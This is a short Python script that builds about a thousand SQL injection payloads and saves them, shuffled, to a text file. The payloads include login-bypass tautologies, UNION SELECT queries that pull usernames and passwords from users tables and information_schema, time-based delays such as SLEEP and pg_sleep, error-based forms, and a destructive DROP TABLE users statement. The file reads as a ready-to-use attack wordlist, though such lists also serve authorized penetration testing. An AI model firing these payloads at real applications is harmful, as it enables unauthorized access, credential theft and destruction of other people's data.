import random

def generate_payloads():
    payloads = []

    # Numeric payloads
    for _ in range(1000):
        i = random.randint(1, 1000)
        payloads.append(f"' OR {i}={i} --")

    # String payloads
    strings = ["admin", "user", "guest", "test", "administrator"]
    for s in strings:
        payloads.append(f"' OR username='{s}' --")

    # Union-based payloads
    tables = ["users", "products", "orders", "customers", "employees"]
    columns = ["username", "password", "email", "fullname", "address"]
    for table in tables:
        for column in columns:
            payloads.append(f"' UNION SELECT {column} FROM {table} --")

    # Time-based payloads
    time_delays = ["SLEEP(5)", "WAITFOR DELAY '0:0:5'", "pg_sleep(5)"]
    for delay in time_delays:
        payloads.append(f"'; {delay} --")

    # Error-based payloads
    payloads.append("' OR 1/0 --")
    payloads.append("' AND 1/0 --")

    # Other variations
    payloads.append("'; DROP TABLE users; --")
    payloads.append("'; SELECT @@version; --")
    payloads.append("' OR '1'='1'; --")

    # Additional payloads
    payloads.append("' OR 1=1; --")
    payloads.append("' OR 'x'='x'; --")
    payloads.append("' OR '1'='1'; --")
    payloads.append("' OR 1=1 UNION SELECT null, username, password FROM users; --")
    payloads.append("' OR 1=1 ORDER BY 1; --")
    payloads.append("' OR 1=1 GROUP BY 1; --")
    payloads.append("' OR 1=1 LIMIT 1 OFFSET 0; --")
    payloads.append("' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables; --")

    return payloads

def main():
    payloads = generate_payloads()
    random.shuffle(payloads)

    with open("payloads.txt", "w") as f:
        for payload in payloads:
            f.write(f"{payload}\n")

    print(f"Generated and saved {len(payloads)} SQL injection payloads to 'payloads.txt'.")

if __name__ == "__main__":
    main()
